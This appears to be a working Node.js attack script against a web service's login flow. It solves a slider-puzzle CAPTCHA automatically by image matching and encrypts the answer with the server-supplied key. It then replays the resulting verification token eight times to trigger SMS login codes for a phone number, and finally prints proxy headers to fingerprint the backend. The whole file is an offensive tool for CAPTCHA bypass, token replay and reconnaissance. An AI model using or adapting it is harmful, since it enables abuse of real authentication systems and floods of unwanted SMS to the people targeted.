import {B,H,j,aes,solveV2} from './lib_captcha.mjs';
import crypto from 'node:crypto';
const uid=crypto.randomUUID();
const cap=await j(fetch(B+'/api/auth/captcha/behavior?'+new URLSearchParams({captchaType:'blockPuzzle',clientUid:uid,ts:String(Date.now())}),{headers:H}));
const d=cap.data;
const r=solveV2(Buffer.from(d.originalImageBase64,'base64'),Buffer.from(d.jigsawImageBase64,'base64'));
const best=r.nccTop[0];
const pointJson=aes(JSON.stringify({x:best.dx,y:5}),d.secretKey);
const chk=await j(fetch(B+'/api/auth/captcha/behavior',{method:'POST',headers:H,body:JSON.stringify({captchaType:'blockPuzzle',token:d.token,pointJson,clientUid:uid,ts:Date.now()})}));
console.log('check ->',JSON.stringify(chk.data));
const cv=aes(d.token+'---'+pointJson,d.secretKey);
console.log('cv=',cv);
// 同一 cv 反复打 8 次，看是否有实例命中
for(let i=0;i<8;i++){
  const r2=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone:'19900000200',scene:'login',captchaVerification:cv})}));
  const ip=(await j(fetch('https://getip.muchcloud.com/',{headers:H})).catch(()=>({})))?.ip;
  console.log(i,'->',r2.code,r2.msg);
  await new Promise(r=>setTimeout(r,300));
}
// 打印 nginx 上游指纹（server header / via）
const h=await fetch(B+'/api/auth/session',{headers:H});
console.log('resp headers:', JSON.stringify(Object.fromEntries([...h.headers].filter(([k])=>['server','via','x-cache','x-upstream','set-cookie','x-request-id'].includes(k)))));
